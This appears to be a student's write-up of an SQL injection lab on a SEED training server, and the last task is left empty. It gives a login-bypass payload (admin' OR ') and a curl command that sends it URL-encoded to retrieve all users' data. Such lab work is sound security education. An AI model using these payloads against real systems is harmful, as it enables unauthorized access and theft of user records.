# SQL Injection

## Task 1
To get all the data associated to Alice we just needed to run this simple query: SELECT * FROM credential WHERE Name = 'Alice';

## Task 2

### Task 2.1
To login as the admin we can just insert on the username the following sentence: admin' OR '
This will change the query so that the hashed password is irrelevant.

### Task 2.2
On the terminal, if we run the command "$ curl www.seed-server.com/unsafe_home.php?username=admin%27or%27 " we can login as an admin. On the terminal will be printed the html code with the data of all users.

### Task 2.3


